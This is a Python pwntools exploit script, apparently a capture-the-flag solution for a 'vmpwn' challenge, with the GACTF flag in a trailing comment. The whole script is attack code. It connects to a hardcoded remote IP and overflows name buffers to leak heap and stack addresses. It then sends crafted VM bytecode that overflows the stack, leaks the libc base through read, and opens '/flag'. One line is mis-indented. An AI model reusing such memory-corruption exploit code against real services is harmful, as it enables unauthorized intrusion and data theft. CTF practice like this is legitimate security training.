from pwn import *

libc=ELF("./libc-2.23.so")

for i in range(30):
	#io=process('vmpwn')
	io=remote('124.70.153.199',8666)
	io.recvuntil('your name:')
	name='a'*0xe8+'bbbbbbbb'
	io.send(name)
	io.recvuntil('bbbbbbbb')
	heap=u64(io.recv(6).ljust(8,'\x00'))
	print(hex(heap))

	io.recvuntil('say:')
	code='b'*0x100+'\x20\xf0'
	io.send(code)
	try:
		io.recvuntil('your name:')
		name='s'*0xf8+'bbbbbbbb'
		io.send(name)
		io.recvuntil('bbbbbbbb')
		end=u64(io.recv(6).ljust(8,'\x00'))
		print(hex(end))

		sh=heap+0x2d18		
		pl=p8(0x11)+p64(end+0x8f)+p8(0x8f)+p8(2)
		pl+=p8(0x11)+p64(0)+p8(0x12)+p64(end+0x9f+8)+p8(0x13)+p64(0x8)+p8(0x8f)+p8(0)
		pl+=p8(0x11)+p64(0)+p8(0x12)+p64(end)+p8(0x13)+p64(0x10)+p8(0x8f)+p8(0)
		pl+=p8(0x11)+p64(end)+p8(0x12)+p64(0)+p8(0x8f)+p8(3)
		pl+=p8(0x11)+p64(3)+p8(0x12)+p64(end)+p8(0x13)+p64(0x100)+p8(0x8f)+p8(0)
		pl+=p8(0x11)+p64(1)+p8(0x12)+p64(end)+p8(0x13)+p64(0x100)+p8(0x8f)+p8(1)
		pl=pl.ljust(0x100,'\xff')+p64(sh)
		#raw_input()
		io.send(pl)
		read_add=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
		libc_base=read_add-libc.sym['read']
		fopen=libc_base+libc.sym['open']
		print(hex(libc_base))
                io.send(p64(fopen))
		io.send('/flag')


		io.interactive()
		break
	except:
		pass



#GACTF{vM_stAck_0verflow_is_Easy_85f8ea2e20}



